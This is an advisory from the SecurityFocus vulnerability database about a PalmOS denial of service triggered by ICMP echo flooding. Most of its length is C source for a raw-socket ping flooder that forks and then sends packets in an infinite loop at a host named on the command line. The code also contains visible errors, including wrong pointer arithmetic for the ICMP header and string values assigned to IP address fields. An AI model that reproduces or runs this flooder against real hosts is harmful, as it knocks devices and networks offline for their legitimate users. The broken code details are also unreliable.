source: http://www.securityfocus.com/bid/7597/info

A problem with PalmOS may result in a denial of service.

It has been reported that PalmOS becomes unstable when flooded with ICMP ECHO_REQUEST traffic. A remote attacker can trigger a device lockup condition or cause the Palm OS device to loose network connectivity.

This could allow a remote attacker to deny service to legitimate users of a PalmOS device that is connected to a network. 

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
int main(int argc, char *argv[]) {
        if(argc < 2) {
                printf("Usage: %s <host>\n", argv[0]);
                exit(0);
        }

        int sock;
        char packet[2000];
        struct sockaddr_in dest;
        struct hostent *host;
        struct iphdr *ip = (struct iphdr *) packet;
        struct icmphdr *icmp = (struct icmp *) packet + sizeof(struct iphdr);
        if((host = gethostbyname(argv[1])) == NULL) {
                printf("Couldn't resolve host!\n");
                exit(-1);
        }

        if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
                printf("Couldn't make socket!\n");
                printf("You must be root to create a raw socket.\n");
                exit(-1);
        }

        dest.sin_family = AF_INET;
        dest.sin_addr = *((struct in_addr *)host->h_addr);
        ip->ihl = 5;
        ip->id = htons(1337);
        ip->ttl = 255;
        ip->tos = 0;
        ip->protocol = IPPROTO_ICMP;
        ip->version = 4;
        ip->frag_off = 0;
        ip->saddr = htons("127.0");
        ip->daddr = inet_ntoa(dest.sin_addr);
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
        ip->check = 0;
        icmp->checksum = 0;
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        printf("Ping flooding %s!\n", argv[1]);
        fork();
        fork();
        while(1) {
                sendto(sock, packet, ip->tot_len, 0,(struct sockaddr *)&dest, sizeof(struct sockaddr));
        }
        return(0);
}

